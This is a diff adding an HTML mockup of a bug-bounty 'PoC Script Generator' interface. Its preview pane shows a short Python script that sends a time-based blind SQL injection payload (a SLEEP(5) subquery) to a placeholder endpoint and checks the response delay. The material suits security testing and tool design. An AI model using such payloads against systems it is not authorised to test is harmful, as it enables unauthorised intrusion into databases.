@@ -1,0 +1,212 @@
+<!DOCTYPE html>
+
+<html class="dark" lang="en"><head>
+<meta charset="utf-8"/>
+<meta content="width=device-width, initial-scale=1.0" name="viewport"/>
+<title>RedClaw PoC Script Generator</title>
+<script src="https://cdn.tailwindcss.com?plugins=forms,container-queries"></script>
+<link href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@300;400;500;600;700&amp;family=Space+Mono&amp;display=swap" rel="stylesheet"/>
+<link href="https://fonts.googleapis.com/css2?family=Material+Symbols+Outlined:wght,FILL@100..700,0..1&amp;display=swap" rel="stylesheet"/>
+<script id="tailwind-config">
+        tailwind.config = {
+          darkMode: "class",
+          theme: {
+            extend: {
+              colors: {
+                "primary": "#ffbf00",
+                "background-light": "#f8f8f5",
+                "background-dark": "#0A0C0E",
+                "surface": "#14161a",
+                "border-gray": "#2d2d2d"
+              },
+              fontFamily: {
+                "display": ["Space Grotesk"],
+                "mono": ["Space Mono", "monospace"]
+              },
+              borderRadius: {"DEFAULT": "0.125rem", "lg": "0.25rem", "xl": "0.5rem", "full": "0.75rem"},
+            },
+          },
+        }
+      </script>
+<style>
+        body {
+            font-family: 'Space Grotesk', sans-serif;
+            background-color: #0A0C0E;
+        }
+        .code-editor {
+            font-family: 'Space Mono', monospace;
+            line-height: 1.6;
+        }
+        .custom-scrollbar::-webkit-scrollbar {
+            width: 4px;
+        }
+        .custom-scrollbar::-webkit-scrollbar-track {
+            background: #14161a;
+        }
+        .custom-scrollbar::-webkit-scrollbar-thumb {
+            background: #ffbf00;
+        }
+        .brutalist-border {
+            border: 1px solid #2d2d2d;
+        }
+        .brutalist-border-focus:focus-within {
+            border-color: #ffbf00;
+        }
+    </style>
+</head>
+<body class="bg-background-light dark:bg-background-dark text-slate-200 min-h-screen flex items-center justify-center p-4">
+<!-- Modal Overlay Backdrop -->
+<div class="fixed inset-0 bg-black/80 backdrop-blur-sm z-0"></div>
+<!-- Main Generator Modal -->
+<div class="relative z-10 w-full max-w-6xl bg-surface brutalist-border overflow-hidden flex flex-col shadow-2xl">
+<!-- Header -->
+<header class="border-b border-border-gray p-4 flex items-center justify-between bg-surface">
+<div class="flex items-center gap-3">
+<div class="w-3 h-3 bg-primary animate-pulse"></div>
+<h1 class="text-sm font-bold tracking-widest uppercase">
+                    Generating PoC: <span class="text-primary">SQL Injection (P1)</span>
+</h1>
+</div>
+<div class="flex items-center gap-4 text-[10px] font-mono uppercase text-slate-500">
+<span>Ref: RC-9928-SQLI</span>
+<button class="hover:text-primary transition-colors">
+<svg class="w-5 h-5" fill="none" stroke="currentColor" viewbox="0 0 24 24"><path d="M6 18L18 6M6 6l12 12" stroke-linecap="round" stroke-linejoin="round" stroke-width="2"></path></svg>
+</button>
+</div>
+</header>
+<!-- Main Workspace -->
+<div class="flex flex-col lg:flex-row h-[650px]">
+<!-- Left Pane: Template Selection -->
+<aside class="w-full lg:w-1/4 border-r border-border-gray p-5 flex flex-col gap-6 bg-surface">
+<div class="space-y-4">
+<h2 class="text-[11px] font-bold text-slate-500 uppercase tracking-widest">Template Selection</h2>
+<div class="space-y-2">
+<label class="text-[10px] uppercase font-bold text-primary">Language</label>
+<select class="w-full bg-background-dark border border-border-gray text-sm p-2 rounded-none focus:ring-1 focus:ring-primary focus:border-primary outline-none">
+<option>Python (Requests)</option>
+<option>Go (Fiber/Native)</option>
+<option>cURL Bash Script</option>
+<option>Node.js (Axios)</option>
+</select>
+</div>
+<div class="space-y-2">
+<label class="text-[10px] uppercase font-bold text-primary">Target Endpoint</label>
+<input class="w-full bg-background-dark border border-border-gray text-[12px] p-2 rounded-none focus:ring-1 focus:ring-primary outline-none" readonly="" type="text" value="https://api.vulnerable-target.com/v1/user/search"/>
+</div>
+<div class="space-y-2">
+<label class="text-[10px] uppercase font-bold text-primary">Payload Type</label>
+<select class="w-full bg-background-dark border border-border-gray text-sm p-2 rounded-none focus:ring-1 focus:ring-primary outline-none">
+<option>Error Based</option>
+<option>Union Based (Extract Data)</option>
+<option selected="">Time Based Blind</option>
+<option>Boolean Inference</option>
+</select>
+</div>
+<div class="pt-4 border-t border-border-gray/30">
+<div class="flex items-center gap-2 text-[10px] text-slate-400">
+<svg class="w-4 h-4 text-primary" fill="currentColor" viewbox="0 0 20 20"><path clip-rule="evenodd" d="M18 10a8 8 0 11-16 0 8 8 0 0116 0zm-7-4a1 1 0 11-2 0 1 1 0 012 0zM9 9a1 1 0 000 2v3a1 1 0 001 1h1a1 1 0 100-2v-3a1 1 0 00-1-1H9z" fill-rule="evenodd"></path></svg>
+<span>Findings extracted from BugCrowd #122-A</span>
+</div>
+</div>
+</div>
+</aside>
+<!-- Center Pane: Script Preview -->
+<main class="flex-1 bg-background-dark relative flex flex-col">
+<div class="flex items-center justify-between px-4 py-2 bg-surface/50 border-b border-border-gray">
+<span class="text-[10px] font-mono text-slate-500 uppercase">poc_exploit.py</span>
+<span class="text-[10px] font-mono text-primary uppercase">Read-Only Preview</span>
+</div>
+<div class="flex-1 p-6 code-editor overflow-y-auto custom-scrollbar text-[13px]">
+<div class="flex gap-4">
+<div class="text-slate-600 text-right select-none w-8 border-r border-border-gray/30 pr-2">
+                            1<br/>2<br/>3<br/>4<br/>5<br/>6<br/>7<br/>8<br/>9<br/>10<br/>11<br/>12<br/>13<br/>14<br/>15<br/>16<br/>17<br/>18<br/>19<br/>20
+                        </div>
+<div class="text-slate-300">
+<span class="text-primary">import</span> requests<br/>
+<span class="text-primary">import</span> time<br/>
+<span class="text-primary">import</span> sys<br/>
+<br/>
+                            TARGET = <span class="text-green-500">"https://api.vulnerable-target.com/v1/user/search"</span><br/>
+                            PAYLOAD = <span class="text-green-500">"' AND (SELECT 1 FROM (SELECT(SLEEP(5)))a)--"</span><br/>
+<br/>
+<span class="text-primary">def</span> <span class="text-blue-400">exploit_poc</span>():<br/>
+                                print(<span class="text-green-500">f"[*] Sending payload to {TARGET}"</span>)<br/>
+                                start_time = time.time()<br/>
+                                <br/>
+                                headers = {<span class="text-green-500">'User-Agent'</span>: <span class="text-green-500">'RedClaw-PoC-v2'</span>}<br/>
+                                params = {<span class="text-green-500">'q'</span>: PAYLOAD}<br/>
+                                <br/>
+                                <span class="text-primary">try</span>:<br/>
+                                    response = requests.get(TARGET, params=params, headers=headers, timeout=10)<br/>
+                                    duration = time.time() - start_time<br/>
+                                    <br/>
+                                    <span class="text-primary">if</span> duration &gt;= <span class="text-orange-400">5</span>:<br/>
+                                        print(<span class="text-primary font-bold">"[+] VULNERABILITY CONFIRMED: TIME DELAY DETECTED"</span>)
+                        </div>
+</div>
+</div>
+<!-- Subtle Console Overlay (Triggered by Test) -->
+<div class="absolute bottom-4 right-4 bg-primary text-background-dark text-[10px] font-bold px-3 py-1 uppercase tracking-tighter">
+                    Ready to execute
+                </div>
+</main>
+<!-- Right Pane: Execution Options -->
+<aside class="w-full lg:w-1/4 border-l border-border-gray p-5 flex flex-col gap-6 bg-surface">
+<div class="space-y-4">
+<h2 class="text-[11px] font-bold text-slate-500 uppercase tracking-widest">Execution Options</h2>
+<div class="flex items-center justify-between py-2 border-b border-border-gray/30">
+<span class="text-[11px] uppercase tracking-wider font-medium">Follow Redirects</span>
+<button class="w-10 h-5 bg-primary/20 rounded-full relative p-1 flex items-center justify-end">
+<div class="w-3 h-3 bg-primary rounded-full"></div>
+</button>
+</div>
+<div class="flex items-center justify-between py-2 border-b border-border-gray/30">
+<span class="text-[11px] uppercase tracking-wider font-medium">Use Proxy (Caido)</span>
+<button class="w-10 h-5 bg-slate-800 rounded-full relative p-1 flex items-center">
+<div class="w-3 h-3 bg-slate-500 rounded-full"></div>
+</button>
+</div>
+<div class="flex items-center justify-between py-2 border-b border-border-gray/30">
+<span class="text-[11px] uppercase tracking-wider font-medium">Custom User-Agent</span>
+<button class="w-10 h-5 bg-primary/20 rounded-full relative p-1 flex items-center justify-end">
+<div class="w-3 h-3 bg-primary rounded-full"></div>
+</button>
+</div>
+<div class="space-y-2 pt-4">
+<label class="text-[10px] uppercase font-bold text-primary">Custom Header</label>
+<div class="flex gap-2">
+<input class="w-1/2 bg-background-dark border border-border-gray text-[10px] p-2 outline-none" placeholder="X-Auth-Token" type="text"/>
+<input class="w-1/2 bg-background-dark border border-border-gray text-[10px] p-2 outline-none" placeholder="Value..." type="text"/>
+</div>
+</div>
+<div class="mt-8 p-3 border border-primary/20 bg-primary/5">
+<p class="text-[10px] text-primary leading-relaxed uppercase opacity-80">
+                            Pre-flight check: Target is reachable via automated ping. Latency: 42ms.
+                        </p>
+</div>
+</div>
+</aside>
+</div>
+<!-- Footer Actions -->
+<footer class="border-t border-border-gray p-4 flex flex-col sm:flex-row items-center justify-between gap-4 bg-surface">
+<div class="flex gap-4">
+<button class="px-6 py-2 border border-border-gray text-[11px] font-bold uppercase tracking-widest hover:bg-white hover:text-black transition-all">
+                    Copy to Clipboard
+                </button>
+<button class="px-6 py-2 border border-border-gray text-[11px] font-bold uppercase tracking-widest hover:bg-white hover:text-black transition-all">
+                    Download .PY
+                </button>
+</div>
+<button class="w-full sm:w-auto px-12 py-3 bg-primary text-background-dark text-xs font-black uppercase tracking-[0.2em] shadow-[4px_4px_0px_0px_rgba(255,191,0,0.2)] hover:shadow-none hover:translate-x-[2px] hover:translate-y-[2px] transition-all">
+                Test PoC Now
+            </button>
+</footer>
+</div>
+<!-- Background Decoration Elements (Brutalist Style) -->
+<div class="fixed top-10 left-10 text-[80px] font-black text-white/5 pointer-events-none select-none uppercase">
+        VULN_VALIDATOR
+    </div>
+<div class="fixed bottom-10 right-10 text-[80px] font-black text-white/5 pointer-events-none select-none uppercase">
+        RED_CLAW
+    </div>
+</body></html>
